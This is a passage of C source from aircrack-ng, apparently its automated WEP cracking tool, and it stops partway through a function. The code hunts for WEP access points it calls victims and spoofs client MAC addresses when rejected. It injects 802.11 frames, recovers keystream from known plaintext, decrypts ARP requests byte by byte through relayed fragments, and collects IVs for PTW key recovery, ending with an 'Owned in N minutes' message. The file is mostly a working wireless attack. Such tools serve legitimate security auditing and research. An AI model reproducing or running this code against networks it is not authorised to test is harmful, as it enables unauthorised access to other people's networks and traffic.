/*
 *  Copyright (C) 2005-2009 Andrea Bittau <a.bittau@cs.ucl.ac.uk>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
 *
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include <sys/types.h>
#include <sys/socket.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/uio.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <assert.h>
#include <zlib.h>
#include <signal.h>
#include <stdarg.h>
#include <err.h>
#include <limits.h>

#include "aircrack-ng/defs.h"
#include "aircrack-ng/support/communications.h"
#include "aircrack-ng/osdep/osdep.h"
#include "aircrack-ng/support/pcap_local.h"
#include "aircrack-ng/ptw/aircrack-ptw-lib.h"
#include "aircrack-ng/third-party/ieee80211.h"
#include "aircrack-ng/third-party/ethernet.h"
#include "aircrack-ng/third-party/if_arp.h"
#include "aircrack-ng/third-party/if_llc.h"
#include "aircrack-ng/crypto/crypto.h"
#include "aircrack-ng/version.h"
#include "aircrack-ng/osdep/byteorder.h"

#define FIND_VICTIM 0
#define FOUND_VICTIM 1
#define SENDING_AUTH 2
#define GOT_AUTH 3
#define SPOOF_MAC 4
#define SENDING_ASSOC 5
#define GOT_ASSOC 6

#define LINKTYPE_IEEE802_11 105
#define TCPDUMP_MAGIC 0xA1B2C3D4

#define S_LLC_SNAP "\xAA\xAA\x03\x00\x00\x00"
#define S_LLC_SNAP_ARP (S_LLC_SNAP "\x08\x06")
#define S_LLC_SNAP_IP (S_LLC_SNAP "\x08\x00")
#define PADDED_ARPLEN 54

#define MCAST_PREF "\x01\x00\x5e\x00\x00"

#define WEP_FILE "wep.cap"
#define KEY_FILE "key.log"
#define PRGA_FILE "prga.log"
#define KEYLIMIT 1000000

// unused, but needed for link
struct communication_options opt;
struct devices dev;
extern struct wif *_wi_in, *_wi_out;

struct frag_state
{
	struct ieee80211_frame fs_wh;
	struct timeval fs_last;
	int fs_len;
	int fs_waiting_relay;
	unsigned char * fs_data;
	unsigned char * fs_ptr;
};

struct prga_info
{
	unsigned char * pi_prga;
	int pi_len;
	unsigned char pi_iv[3];
};

static struct wstate
{
	int ws_state;
	struct timeval ws_arpsend;
	char * ws_netip;
	int ws_netip_arg;
	int ws_max_chan;
	unsigned char * ws_rtrmac;
	unsigned char ws_mymac[6];
	int ws_have_mac;
	char ws_myip[16];
	unsigned char * ws_victim_mac;
	PTW_attackstate * ws_ptw;
	unsigned int ws_ack_timeout;
	int ws_min_prga;
	int ws_thresh_incr;
	int ws_crack_dur;
	int ws_wep_thresh;
	int ws_crack_pid;
	struct timeval ws_crack_start;
	struct timeval ws_real_start;
	struct timeval ws_lasthop;
	struct timeval ws_last_wcount;
	struct wif * ws_wi;
	unsigned int ws_last_wep_count;
	int ws_ignore_ack;

	/* tx_state */
	int ws_waiting_ack;
	struct timeval ws_tsent;
	int ws_retries;
	unsigned int ws_psent;

	/* chan_info */
	int ws_chan;

	/* victim_info */
	char * ws_ssid;
	int ws_apchan;
	unsigned char ws_bss[6];

	struct frag_state ws_fs;
	struct prga_info ws_pi;

	/* decrypt_state */
	unsigned char * ws_cipher;
	int ws_clen;
	struct prga_info ws_dpi;
	struct frag_state ws_dfs;

	/* wep_log */
	unsigned int ws_packets;
	unsigned int ws_rate;
	int ws_fd;
	unsigned char ws_iv[3];
} _wstate;

#define KEYHSBYTES PTW_KEYHSBYTES

static int PTW_DEFAULTBF[PTW_KEYHSBYTES]
	= {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
	   0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

static void cleanup(int x);
void show_wep_stats(int B,
					int force,
					PTW_tableentry table[PTW_KEYHSBYTES][PTW_n],
					int choices[KEYHSBYTES],
					int depth[KEYHSBYTES],
					int prod);

/* display the current votes */

void show_wep_stats(int B,
					int force,
					PTW_tableentry table[PTW_KEYHSBYTES][PTW_n],
					int choices[KEYHSBYTES],
					int depth[KEYHSBYTES],
					int prod)
{
	UNUSED_PARAM(B);
	UNUSED_PARAM(force);
	UNUSED_PARAM(table);
	UNUSED_PARAM(choices);
	UNUSED_PARAM(depth);
	UNUSED_PARAM(prod);
}

static inline struct wstate * get_ws(void) { return &_wstate; }

static void time_print(char * fmt, ...)
{
	REQUIRE(fmt != NULL);

	va_list ap;
	char lame[1024];
	time_t tt;
	struct tm * t;

	va_start(ap, fmt);
	vsnprintf(lame, sizeof(lame), fmt, ap);
	va_end(ap);

	tt = time(NULL);

	if (tt == (time_t) -1)
	{
		perror("time()");
		exit(EXIT_FAILURE);
	}

	t = localtime(&tt);
	if (!t)
	{
		perror("localtime()");
		exit(EXIT_FAILURE);
	}

	printf("[%.2d:%.2d:%.2d] %s", t->tm_hour, t->tm_min, t->tm_sec, lame);
}

static void check_key(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	char buf[1024];
	int fd;
	int rd;
	struct timeval now;

	fd = open(KEY_FILE, O_RDONLY);

	if (fd == -1)
	{
		return;
	}

	rd = read(fd, buf, sizeof(buf) - 1);
	if (rd == -1)
	{
		perror("read()");
		exit(EXIT_FAILURE);
	}

	buf[rd] = 0;

	close(fd);

	printf("\n\n");
	time_print("KEY=(%s)\n", buf);

	if (gettimeofday(&now, NULL) == -1)
	{
		perror("gettimeofday()");
		exit(EXIT_FAILURE);
	}

	printf("Owned in %.02f minutes\n",
		   ((double) now.tv_sec - ws->ws_real_start.tv_sec) / 60.0);

	cleanup(0);
	exit(EXIT_SUCCESS);
}

static void kill_crack(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	if (ws->ws_crack_pid == 0) return;

	printf("\n");
	time_print("Stopping crack PID=%d\n", ws->ws_crack_pid);

	// XXX doesn't return -1 for some reason! [maybe on my box... so it
	// might be buggy on other boxes...]
	if (kill(ws->ws_crack_pid, SIGINT) == -1)
	{
#if 0
		perror("kill()");
		exit(1);
#endif
	}

	ws->ws_crack_pid = 0;

	check_key(ws);
}

static void cleanup(int x)
{
	UNUSED_PARAM(x);

	struct wstate * ws = get_ws();

	ALLEGE(ws != NULL); //-V547

	printf("\n");
	time_print("Dying...\n");

	if (ws->ws_fd) close(ws->ws_fd);

	kill_crack(ws);

	if (ws->ws_wi) wi_close(ws->ws_wi);

	if (ws->ws_ssid) free(ws->ws_ssid);

	exit(EXIT_SUCCESS);
}

static void set_chan(struct wstate * ws, int c)
{
	REQUIRE(ws != NULL);

	if (c == ws->ws_chan) return;

	if (wi_set_channel(ws->ws_wi, c)) err(1, "wi_set_channel()");

	ws->ws_chan = c;
}

static void hexdump(unsigned char * ptr, int len)
{
	REQUIRE(ptr != NULL);
	REQUIRE(len >= 0);

	while (len > 0)
	{
		printf("%.2X ", *ptr);
		ptr++;
		len--;
	}
	printf("\n");
}

static void inject(struct wif * wi, void * buf, int len)
{
	int rc = wi_write(wi, NULL, LINKTYPE_IEEE802_11, buf, len, NULL);

	if (rc == -1)
	{
		perror("writev()");
		exit(EXIT_FAILURE);
	}
	if (rc != len)
	{
		time_print("ERROR: Packet length changed while transmitting (%d "
				   "instead of %d).\n",
				   rc,
				   len);
		exit(EXIT_FAILURE);
	}
}

static void send_frame(struct wstate * ws, unsigned char * buf, int len)
{
	REQUIRE(ws != NULL);

	static unsigned char * lame = NULL;
	static int lamelen = 0;
	static int lastlen = 0;

	// retransmit!
	if (len == -1)
	{
		ws->ws_retries++;

		if (ws->ws_ignore_ack && ws->ws_retries >= ws->ws_ignore_ack)
		{
			ws->ws_waiting_ack = 0;
			return;
		}

		if (ws->ws_retries > 10)
		{
			time_print("ERROR Max retransmits for (%d bytes):\n", lastlen);
			hexdump(&lame[0], lastlen);
		}
		len = lastlen;
	}
	// normal tx
	else
	{
		ALLEGE(ws->ws_waiting_ack == 0);

		if (len > lamelen)
		{
			if (lame) free(lame);

			lame = (unsigned char *) malloc(len);
			if (!lame)
			{
				perror("malloc()");
				exit(EXIT_FAILURE);
			}

			lamelen = len;
		}

		REQUIRE(lame != NULL);
		memcpy(lame, buf, len);
		ws->ws_retries = 0;
		lastlen = len;
	}

	inject(ws->ws_wi, lame, len);

	if (ws->ws_ignore_ack != 1) ws->ws_waiting_ack = 1;

	ws->ws_psent++;
	if (gettimeofday(&ws->ws_tsent, NULL) == -1)
	{
		perror("gettimeofday()");
		exit(EXIT_FAILURE);
	}
}

static void fill_basic(struct wstate * ws, struct ieee80211_frame * wh)
{
	REQUIRE(ws != NULL);
	REQUIRE(wh != NULL);

	unsigned short * sp;

	memcpy(wh->i_addr1, ws->ws_bss, 6);
	memcpy(wh->i_addr2, ws->ws_mymac, 6);
	memcpy(wh->i_addr3, ws->ws_bss, 6);

	sp = (unsigned short *) wh->i_seq;
	*sp = fnseq(0, ws->ws_psent);

	sp = (unsigned short *) wh->i_dur;
	*sp = htole16(32767);
}

static void send_assoc(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	unsigned char buf[sizeof(struct ieee80211_frame) * 32];
	struct ieee80211_frame * wh = (struct ieee80211_frame *) buf;
	unsigned char * body;
	int ssidlen;

	memset(buf, 0, sizeof(buf));
	fill_basic(ws, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_ASSOC_REQ;

	body = (unsigned char *) wh + sizeof(*wh);
	*body = 1 | IEEE80211_CAPINFO_PRIVACY; // cap
	// cap + interval
	body += 2 + 2;

	// ssid
	*body++ = 0;
	ssidlen = strlen(ws->ws_ssid);
	*body++ = ssidlen;
	memcpy(body, ws->ws_ssid, ssidlen);
	body += ssidlen;

	// rates
	*body++ = IEEE80211_ELEMID_RATES;
	*body++ = 8;
	*body++ = 2 | 0x80;
	*body++ = 4 | 0x80;
	*body++ = 11 | 0x80;
	*body++ = 22 | 0x80;
	*body++ = 12 | 0x80;
	*body++ = 24 | 0x80;
	*body++ = 48 | 0x80;
	*body++ = 72;

	/* x-rates */
	*body++ = IEEE80211_ELEMID_XRATES;
	*body++ = 4;
	*body++ = 48;
	*body++ = 72;
	*body++ = 96;
	*body++ = 108;

	send_frame(ws, buf, (unsigned long) body - (unsigned long) buf);
}

static void wepify(struct wstate * ws, unsigned char * body, int dlen)
{
	REQUIRE(ws != NULL);
	REQUIRE(dlen + 4 <= ws->ws_pi.pi_len);
	REQUIRE(body != NULL);

	uLong crc;
	unsigned int * pcrc;
	int i;

	// iv
	memcpy(body, ws->ws_pi.pi_iv, 3);
	body += 3;
	*body++ = 0;

	// crc
	crc = crc32(0L, Z_NULL, 0);
	crc = crc32(crc, body, dlen);
	pcrc = (unsigned int *) (body + dlen);
	*pcrc = htole32(crc);

	for (i = 0; i < dlen + 4; i++) *body++ ^= ws->ws_pi.pi_prga[i];
}

static void send_auth(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	unsigned char buf[sizeof(struct ieee80211_frame) * 16]
		__attribute__((aligned(8)));
	struct ieee80211_frame * wh = (struct ieee80211_frame *) buf;
	unsigned short * n;

	memset(buf, 0, sizeof(buf));
	fill_basic(ws, wh);
	wh->i_fc[0] |= IEEE80211_FC0_TYPE_MGT | IEEE80211_FC0_SUBTYPE_AUTH;

	/* transaction number */
	n = (unsigned short *) ((unsigned char *) wh + sizeof(*wh)); //-V1032
	n++;
	*n = htole16(1);

	send_frame(ws, buf, sizeof(*wh) + 2 + 2 + 2);
}

static int
get_victim_ssid(struct wstate * ws, struct ieee80211_frame * wh, int len)
{
	REQUIRE(wh != NULL);

	unsigned char * ptr;
	int x;
	int gots = 0, gotc = 0;

	if (len <= (int) sizeof(*wh))
	{
		time_print("Warning: short packet in get_victim_ssid()\n");
		return (0);
	}

	ptr = (unsigned char *) wh + sizeof(*wh);
	len -= sizeof(*wh);

	// only wep baby
	if (!(IEEE80211_BEACON_CAPABILITY(ptr) & IEEE80211_CAPINFO_PRIVACY))
	{
		return (0);
	}

	REQUIRE(ws != NULL);

	// we want a specific victim
	if (ws->ws_victim_mac)
	{
		if (memcmp(wh->i_addr3, ws->ws_victim_mac, 6) != 0) return (0);
	}

	// beacon header
	x = 8 + 2 + 2;
	if (len <= x)
	{
		time_print("Warning short.\n");
		return (0);
	}

	ptr += x;
	len -= x;

	// SSID
	while (len > 2)
	{
		int eid, elen;

		eid = *ptr;
		ptr++;
		elen = *ptr;
		ptr++;
		len -= 2;

		if (len < elen)
		{
			time_print("Warning short....\n");
			return (0);
		}

		// ssid
		if (eid == 0)
		{
			if (ws->ws_ssid) free(ws->ws_ssid);

			ws->ws_ssid = (char *) malloc(elen + 1);
			if (!ws->ws_ssid)
			{
				perror("malloc()");
				exit(EXIT_FAILURE);
			}

			memcpy(ws->ws_ssid, ptr, elen);
			ws->ws_ssid[elen] = 0;
			gots = 1;
		}
		// chan
		else if (eid == 3)
		{
			if (elen != 1)
			{
				time_print("Warning len of chan not 1\n");
				return (0);
			}

			ws->ws_apchan = *ptr;
			gotc = 1;
		}

		ptr += elen;
		len -= elen;
	}

	if (gots && gotc)
	{
		memcpy(ws->ws_bss, wh->i_addr3, 6);
		set_chan(ws, ws->ws_apchan);
		ws->ws_state = FOUND_VICTIM;

		char * mac = mac2string(ws->ws_bss);
		ALLEGE(mac != NULL);
		time_print("Found SSID(%s) BSS=(%s) chan=%d\n",
				   ws->ws_ssid,
				   mac,
				   ws->ws_apchan);
		free(mac);
		return (1);
	}

	return (0);
}

static void send_ack(struct wstate * ws)
{
	UNUSED_PARAM(ws);
	/* firmware acks */
}

static void do_llc(unsigned char * buf, unsigned short type)
{
	REQUIRE(buf != NULL);

	struct llc * h = (struct llc *) buf;

	memset(h, 0, sizeof(*h));
	h->llc_dsap = LLC_SNAP_LSAP;
	h->llc_ssap = LLC_SNAP_LSAP;
	h->llc_un.type_snap.control = 3;
	h->llc_un.type_snap.ether_type = htons(type);
}

static void set_prga(struct wstate * ws,
					 unsigned char * iv,
					 unsigned char * cipher,
					 unsigned char * clear,
					 int len)
{
	REQUIRE(ws != NULL);

	int i;
	int fd;

	if (ws->ws_pi.pi_len != 0) free(ws->ws_pi.pi_prga);

	ws->ws_pi.pi_prga = (unsigned char *) malloc(len);
	if (!ws->ws_pi.pi_prga)
	{
		perror("malloc()");
		exit(EXIT_FAILURE);
	}

	ws->ws_pi.pi_len = len;
	memcpy(ws->ws_pi.pi_iv, iv, 3);

	for (i = 0; i < len; i++)
	{
		ws->ws_pi.pi_prga[i] = (cipher ? (clear[i] ^ cipher[i]) : clear[i]);
	}

	time_print("Got %d bytes of prga IV=(%.02x:%.02x:%.02x) PRGA=",
			   ws->ws_pi.pi_len,
			   ws->ws_pi.pi_iv[0],
			   ws->ws_pi.pi_iv[1],
			   ws->ws_pi.pi_iv[2]);
	hexdump(ws->ws_pi.pi_prga, ws->ws_pi.pi_len);

	if (!cipher) return;

	fd = open(
		PRGA_FILE, O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);

	if (fd == -1)
	{
		perror("open()");
		exit(EXIT_FAILURE);
	}

	i = write(fd, ws->ws_pi.pi_iv, 3);
	if (i == -1)
	{
		perror("write()");
		exit(EXIT_FAILURE);
	}
	if (i != 3)
	{
		printf("Wrote %d out of %d\n", i, 3);
		exit(EXIT_FAILURE);
	}

	i = write(fd, ws->ws_pi.pi_prga, ws->ws_pi.pi_len);
	if (i == -1)
	{
		perror("write()");
		exit(EXIT_FAILURE);
	}
	if (i != ws->ws_pi.pi_len)
	{
		printf("Wrote %d out of %d\n", i, ws->ws_pi.pi_len);
		exit(EXIT_FAILURE);
	}

	close(fd);
}

static void proc_ctl(struct wstate * ws, int stype)
{
	if (stype == IEEE80211_FC0_SUBTYPE_ACK)
	{
		REQUIRE(ws != NULL);

		ws->ws_waiting_ack = 0;
		return;
	}
	else if (stype == IEEE80211_FC0_SUBTYPE_RTS)
	{
		return;
	}
	else if (stype == IEEE80211_FC0_SUBTYPE_CTS)
	{
		return;
	}

	time_print("got CTL=%x\n", stype);
}

static void proc_mgt(struct wstate * ws, int stype, unsigned char * body)
{
	unsigned short * rc;
	unsigned short * sc;
	unsigned int aid;

	if (stype == IEEE80211_FC0_SUBTYPE_DEAUTH)
	{
		REQUIRE(ws != NULL);
		REQUIRE(body != NULL);

		rc = (unsigned short *) body;

		printf("\n");
		time_print("Got deauth=%u\n", le16toh(*rc));
		ws->ws_state = FOUND_VICTIM;
		return;
	}
	else if (stype == IEEE80211_FC0_SUBTYPE_AUTH)
	{
		REQUIRE(ws != NULL);
		REQUIRE(body != NULL);

		sc = (unsigned short *) body;

		if (ws->ws_state != SENDING_AUTH) /* We didn't ask for it. */
			return;

		if (le16toh(*sc) != 0)
		{
			time_print("Warning got auth algo=%x\n", le16toh(*sc));
			exit(EXIT_FAILURE);
			return;
		}
		sc++;

		if (le16toh(*sc) != 2)
		{
			time_print("Warning got auth seq=%x\n", le16toh(*sc));
			return;
		}

		sc++;

		if (le16toh(*sc) == 1)
		{
			time_print("Auth rejected.  Spoofin mac.\n");
			ws->ws_state = SPOOF_MAC;
			return;
		}
		else if (le16toh(*sc) == 0)
		{
			time_print("Authenticated\n");
			ws->ws_state = GOT_AUTH;
			return;
		}
		else
		{
			time_print("Got auth %x\n", *sc);
			exit(EXIT_FAILURE);
		}
	}
	else if (stype == IEEE80211_FC0_SUBTYPE_ASSOC_RESP)
	{
		REQUIRE(ws != NULL);
		REQUIRE(body != NULL);

		sc = (unsigned short *) body;
		sc++; // cap

		if (ws->ws_state != SENDING_ASSOC) /* We didn't ask for it. */
			return;

		if (le16toh(*sc) == 0)
		{
			sc++;
			aid = le16toh(*sc) & 0x3FFF;
			time_print("Associated (ID=%x)\n", aid);
			ws->ws_state = GOT_ASSOC;
			return;
		}
		else if (le16toh(*sc) == 12 || le16toh(*sc) == 1)
		{
			time_print("Assoc rejected..."
					   " trying to spoof mac.\n");
			ws->ws_state = SPOOF_MAC;
			return;
		}
		else
		{
			time_print("got assoc %d\n", le16toh(*sc));
			exit(EXIT_FAILURE);
		}
	}
	else if (stype == IEEE80211_FC0_SUBTYPE_PROBE_RESP)
	{
		return;
	}

	time_print("\nGOT MAN=%x\n", stype);
	exit(EXIT_FAILURE);
}

static void proc_data(struct wstate * ws, struct ieee80211_frame * wh, int len)
{
	REQUIRE(wh != NULL);

	int dlen;
	dlen = len - sizeof(*wh) - 4 - 4;

	if (!(wh->i_fc[1] & IEEE80211_FC1_WEP))
	{
		char * mac = mac2string(wh->i_addr2);
		ALLEGE(mac != NULL);
		time_print("WARNING: Got NON wep packet from %s dlen %d\n", mac, dlen);
		free(mac);
		return;
	}

	ALLEGE(wh->i_fc[1] & IEEE80211_FC1_WEP);
	ALLEGE(ws != NULL);

	if ((dlen == 36 || dlen == PADDED_ARPLEN)
		&& ws->ws_rtrmac == (unsigned char *) 1)
	{
		ws->ws_rtrmac = (unsigned char *) malloc(6);
		if (!ws->ws_rtrmac)
		{
			perror("malloc()");
			exit(EXIT_FAILURE);
		}

		memcpy(ws->ws_rtrmac, wh->i_addr3, 6);

		char * mac = mac2string(ws->ws_rtrmac);
		ALLEGE(mac != NULL);
		time_print("Got arp reply from (%s)\n", mac);
		free(mac);
	}
}

static void
stuff_for_us(struct wstate * ws, struct ieee80211_frame * wh, int len)
{
	REQUIRE(wh != NULL);

	int type, stype;
	unsigned char * body = (unsigned char *) (wh + 1);

	type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
	stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

	// CTL
	if (type == IEEE80211_FC0_TYPE_CTL)
	{
		proc_ctl(ws, stype);
		return;
	}

	// MGM
	if (type == IEEE80211_FC0_TYPE_MGT)
	{
		proc_mgt(ws, stype, body);
		return;
	}

	/* Data */
	if (type == IEEE80211_FC0_TYPE_DATA && stype == IEEE80211_FC0_SUBTYPE_DATA)
	{
		proc_data(ws, wh, len);
		return;
	}
}

static void
decrypt_arpreq(struct wstate * ws, struct ieee80211_frame * wh, int rd)
{
	REQUIRE(wh != NULL);

	unsigned char * body;
	int bodylen;
	unsigned char clear[sizeof(struct arphdr) * 32] = {0};
	unsigned char * ptr;
	struct arphdr * h;
	int i;

	body = (unsigned char *) wh + sizeof(*wh);
	ptr = clear;

	// calculate clear-text
	memcpy(ptr, S_LLC_SNAP_ARP, sizeof(S_LLC_SNAP_ARP) - 1);
	ptr += sizeof(S_LLC_SNAP_ARP) - 1;

	h = (struct arphdr *) ptr; //-V1032
	h->ar_hrd = htons(ARPHRD_ETHER);
	h->ar_pro = htons(ETHERTYPE_IP);
	h->ar_hln = 6;
	h->ar_pln = 4;
	h->ar_op = htons(ARPOP_REQUEST);
	ptr += sizeof(*h);

	memcpy(ptr, wh->i_addr3, 6);

	REQUIRE(ws != NULL);

	bodylen = rd - sizeof(*wh) - 4 - 4;
	ws->ws_clen = bodylen;
	ws->ws_cipher = (unsigned char *) malloc(ws->ws_clen);
	if (!ws->ws_cipher)
	{
		perror("malloc()");
		exit(EXIT_FAILURE);
	}
	ws->ws_dpi.pi_prga = (unsigned char *) malloc(ws->ws_clen);
	if (!ws->ws_dpi.pi_prga)
	{
		perror("malloc()");
		exit(EXIT_FAILURE);
	}

	memcpy(ws->ws_cipher, &body[4], ws->ws_clen);
	memcpy(ws->ws_dpi.pi_iv, body, 3);

	memset(ws->ws_dpi.pi_prga, 0, ws->ws_clen);
	for (i = 0; i < (8 + 8 + 6); i++)
	{
		ws->ws_dpi.pi_prga[i] = ws->ws_cipher[i] ^ clear[i];
	}

	ws->ws_dpi.pi_len = i;

	char * mac = mac2string(wh->i_addr3);
	ALLEGE(mac != NULL);
	time_print("Got ARP request from (%s)\n", mac);
	free(mac);
}

static void log_wep(struct wstate * ws, struct ieee80211_frame * wh, int len)
{
	REQUIRE(wh != NULL);

	int rd;
	struct pcap_pkthdr pkh;
	struct timeval tv;
	unsigned char * body = (unsigned char *) (wh + 1);

	memset(&pkh, 0, sizeof(pkh));
	pkh.caplen = pkh.len = len;
	if (gettimeofday(&tv, NULL) == -1) err(1, "gettimeofday()");
	pkh.tv_sec = tv.tv_sec;
	pkh.tv_usec = tv.tv_usec;
	if (write(ws->ws_fd, &pkh, sizeof(pkh)) != sizeof(pkh)) err(1, "write()");

	rd = write(ws->ws_fd, wh, len);

	if (rd == -1)
	{
		perror("write()");
		exit(EXIT_FAILURE);
	}
	if (rd != len)
	{
		time_print("short write %d out of %d\n", rd, len);
		exit(EXIT_FAILURE);
	}

	REQUIRE(ws != NULL);

	memcpy(ws->ws_iv, body, 3);
	ws->ws_packets++;
}

static void
add_keystream(struct wstate * ws, struct ieee80211_frame * wh, int rd)
{
	REQUIRE(wh != NULL);

	unsigned char clear[1024];
	int dlen = rd - sizeof(struct ieee80211_frame) - 4 - 4;
	int clearsize;
	unsigned char * body = (unsigned char *) (wh + 1);
	int i, weight[16], k, j;

	k = known_clear(clear, &clearsize, weight, (void *) wh, dlen);
	if (clearsize < 16) return;

	for (j = 0; j < k; j++)
	{
		for (i = 0; i < clearsize; i++) clear[i + (32 * j)] ^= body[4 + i];
	}

	REQUIRE(ws != NULL);

	PTW_addsession(ws->ws_ptw, body, clear, weight, k);
}

static void got_ip(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	unsigned char ip[4] __attribute__((aligned(8)));
	int i;
	struct in_addr * in = (struct in_addr *) ip; //-V1032
	char * ptr;

	for (i = 0; i < 4; i++)
		ip[i]
			= ws->ws_cipher[8 + 8 + 6 + i] ^ ws->ws_dpi.pi_prga[8 + 8 + 6 + i];

	INVARIANT(ws->ws_netip == NULL);
	ws->ws_netip = malloc(16);
	if (!ws->ws_netip)
	{
		perror("malloc()");
		exit(EXIT_FAILURE);
	}

	memset(ws->ws_netip, 0, 16);
	char * netip = inet_ntoa(*in);
	strlcpy(ws->ws_netip, netip ? netip : "", 16);

	time_print("Got IP=(%s)\n", ws->ws_netip);
	memset(ws->ws_myip, 0, sizeof(ws->ws_myip));
	strlcpy(ws->ws_myip, ws->ws_netip, sizeof(ws->ws_myip));

	ptr = strchr(ws->ws_myip, '.');
	ALLEGE(ptr);
	ptr = strchr(ptr + 1, '.');
	ALLEGE(ptr);
	ptr = strchr(ptr + 1, '.');
	ALLEGE(ptr);
	strncpy(ptr + 1, "123", 4);

	time_print("My IP=(%s)\n", ws->ws_myip);

	/* clear decrypt state */
	free(ws->ws_dpi.pi_prga);
	free(ws->ws_cipher);
	ws->ws_cipher = 0;
	ws->ws_clen = 0;
	memset(&ws->ws_dpi, 0, sizeof(ws->ws_dpi));
	memset(&ws->ws_dfs, 0, sizeof(ws->ws_dfs));
}

static void check_relay(struct wstate * ws,
						struct ieee80211_frame * wh,
						unsigned char * body,
						int dlen)
{
	REQUIRE(ws != NULL);
	REQUIRE(wh != NULL);

	// looks like it...
	if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
		&& (memcmp(wh->i_addr3, ws->ws_mymac, 6) == 0)
		&& (memcmp(wh->i_addr1, "\xff\xff\xff\xff\xff\xff", 6) == 0)
		&& dlen == ws->ws_fs.fs_len)
	{
		REQUIRE(body != NULL);

		set_prga(ws, body, &body[4], ws->ws_fs.fs_data, dlen);
		free(ws->ws_fs.fs_data);
		ws->ws_fs.fs_data = 0;
		ws->ws_fs.fs_waiting_relay = 0;
	}

	// see if we get the multicast stuff of when decrypting
	if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
		&& (memcmp(wh->i_addr3, ws->ws_mymac, 6) == 0)
		&& (memcmp(wh->i_addr1, MCAST_PREF, 5) == 0)
		&& dlen == 36)
	{
		REQUIRE(ws->ws_cipher != NULL);

		unsigned char pr = wh->i_addr1[5];

		printf("\n");
		time_print("Got clear-text byte: %d\n",
				   ws->ws_cipher[ws->ws_dpi.pi_len - 1] ^ pr);

		ws->ws_dpi.pi_prga[ws->ws_dpi.pi_len - 1] = pr;
		ws->ws_dpi.pi_len++;
		ws->ws_dfs.fs_waiting_relay = 1;

		// ok we got the ip...
		if (ws->ws_dpi.pi_len == 26 + 1)
		{
			got_ip(ws);
		}
	}
}

static void got_wep(struct wstate * ws, struct ieee80211_frame * wh, int rd)
{
	REQUIRE(ws != NULL);
	REQUIRE(wh != NULL);

	int bodylen;
	int dlen;
	unsigned char clear[1024];
	int clearsize;
	unsigned char * body;

	bodylen = rd - sizeof(struct ieee80211_frame);

	dlen = bodylen - 4 - 4;
	body = (unsigned char *) wh + sizeof(*wh);

	// log it if its stuff not from us...
	if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
		|| ((wh->i_fc[1] & IEEE80211_FC1_DIR_TODS)
			&& memcmp(wh->i_addr2, ws->ws_mymac, 6) != 0))
	{

		if (body[3] != 0)
		{
			time_print("Key index=%x!!\n", body[3]);
			exit(EXIT_FAILURE);
		}
		log_wep(ws, wh, rd);
		add_keystream(ws, wh, rd);
	}

	// look for arp-request packets... so we can decrypt em
	if ((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
		&& (memcmp(wh->i_addr3, ws->ws_mymac, 6) != 0)
		&& (memcmp(wh->i_addr1, "\xff\xff\xff\xff\xff\xff", 6) == 0)
		&& (dlen == 36 || dlen == PADDED_ARPLEN)
		&& !ws->ws_cipher
		&& !ws->ws_netip)
	{
		decrypt_arpreq(ws, wh, rd);
	}

	// we have prga... check if its our stuff being relayed...
	if (ws->ws_pi.pi_len != 0)
	{
		check_relay(ws, wh, body, dlen);
		return;
	}

	known_clear(clear, &clearsize, NULL, (void *) wh, dlen);
	time_print("Datalen %d Known clear %d\n", dlen, clearsize);

	set_prga(ws, body, &body[4], clear, clearsize);
}

static void
stuff_for_net(struct wstate * ws, struct ieee80211_frame * wh, int rd)
{
	REQUIRE(wh != NULL);

	int type, stype;

	type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
	stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

	if (type == IEEE80211_FC0_TYPE_DATA && stype == IEEE80211_FC0_SUBTYPE_DATA)
	{
		REQUIRE(ws != NULL);

		int dlen = rd - sizeof(struct ieee80211_frame);

		if (ws->ws_state == SPOOF_MAC)
		{
			unsigned char mac[6];
			if (wh->i_fc[1] & IEEE80211_FC1_DIR_TODS)
			{
				memcpy(mac, wh->i_addr3, 6);
			}
			else if (wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
			{
				memcpy(mac, wh->i_addr1, 6);
			}
			else
				abort();

			if (mac[0] == 0xff || mac[0] == 0x1) return;

			memcpy(ws->ws_mymac, mac, 6);

